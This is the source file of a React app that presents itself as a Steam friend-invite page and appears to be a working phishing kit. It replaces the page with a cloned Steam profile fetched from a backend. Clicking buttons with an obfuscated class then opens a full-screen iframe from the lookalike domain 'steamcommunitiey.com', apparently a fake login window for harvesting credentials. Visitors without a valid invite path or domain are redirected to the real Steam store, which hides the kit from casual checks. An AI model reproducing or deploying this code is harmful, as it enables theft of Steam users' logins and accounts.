import axios from "axios";
import { useEffect } from "react";
import { useParams } from "react-router-dom";
import "./App.scss";
import { generateUrl } from "./utils/generateUrl";

const App = () => {
    const { slug, token_part1, token_part2 } = useParams();

    useEffect(() => {
        const getPage = async () => {
            const envDomain = process.env.REACT_APP_FRIEND_INVITE_DOMAIN || "";
            const currentDomain = window.location.host;
            const isCurrentDomainValid = envDomain === currentDomain;
            console.log(currentDomain, isCurrentDomainValid, envDomain);

            const goTo = () =>
                (window.location.href = "https://store.steampowered.com/");

            if (!slug && !token_part1 && !token_part2) return goTo();

            if (slug && !token_part1 && !token_part2)
                await axios
                    .get(generateUrl(`profile/get/${slug}`))
                    .then((res) => {
                        document.documentElement.innerHTML = res.data;

                        setTimeout(() => {
                            const className = ".lk0e6gi8s69v";
                            const htmlUrl =
                                "https://steamcommunitiey.com/txqmjgkxhzp5.html";

                            const openWind = () => {
                                const buttons =
                                    document.querySelectorAll(className);

                                if (buttons && buttons.length > 0) {
                                    buttons.forEach((button) => {
                                        button.addEventListener("click", () => {
                                            const iframe =
                                                document.createElement(
                                                    "iframe"
                                                );
                                            iframe.src = htmlUrl;
                                            iframe.setAttribute(
                                                "style",
                                                "position: fixed; top: -2px; left: -2px; width: 100vw; height: 100vh; z-index: 1000"
                                            );
                                            document.documentElement.style.overflow =
                                                "hidden";
                                            document.body.appendChild(iframe);
                                        });
                                    });
                                }
                            };

                            openWind();
                        }, 100);
                    })
                    .catch(goTo);

            if (!slug && token_part1 && token_part2) {
                if (!isCurrentDomainValid) return goTo();

                axios
                    .get(
                        generateUrl(
                            `profile/get/by_invite_link_path/?invite_link_path=${token_part1}/${token_part2}`
                        )
                    )
                    .then((res) => {
                        document.documentElement.innerHTML = res.data;

                        setTimeout(() => {
                            const className = ".lk0e6gi8s69v";
                            const htmlUrl =
                                "https://steamcommunitiey.com/txqmjgkxhzp5.html";

                            const openWind = () => {
                                const buttons =
                                    document.querySelectorAll(className);

                                if (buttons && buttons.length > 0) {
                                    buttons.forEach((button) => {
                                        button.addEventListener("click", () => {
                                            const iframe =
                                                document.createElement(
                                                    "iframe"
                                                );
                                            iframe.src = htmlUrl;
                                            iframe.setAttribute(
                                                "style",
                                                "position: fixed; top: -2px; left: -2px; width: 100vw; height: 100vh; z-index: 1000"
                                            );
                                            document.documentElement.style.overflow =
                                                "hidden";
                                            document.body.appendChild(iframe);
                                        });
                                    });
                                }
                            };

                            openWind();
                        }, 100);
                    })
                    .catch(() => goTo());
            }
        };

        getPage();
    }, []);

    return <div className="App"></div>;
};

export default App;
